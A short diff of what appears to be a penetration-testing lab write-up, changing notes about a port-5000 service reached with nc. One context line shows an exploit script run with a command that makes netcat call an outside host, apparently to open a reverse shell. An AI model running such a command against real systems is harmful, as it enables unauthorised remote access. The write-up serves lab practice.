@@ -130,8 +130,9 @@ $ python2 -u 46501.py -t 127.0.0.1 -p 18000 --cmd 'busybox nc 192.168.45.184 80 
 [+] Runtime.exec() successful, retId=8ef
 [!] Command successfully executed
 ```
-we know port 5000 is listening from external  
-we can trigger it with nc
+we can see port 5000 is also listening    
+it should be the java.net.ServerSocket    
+we can trigger it with nc  
 ```console
 dev@oscp:~$ nc 127.0.0.1 5000
 Available Processors: 1
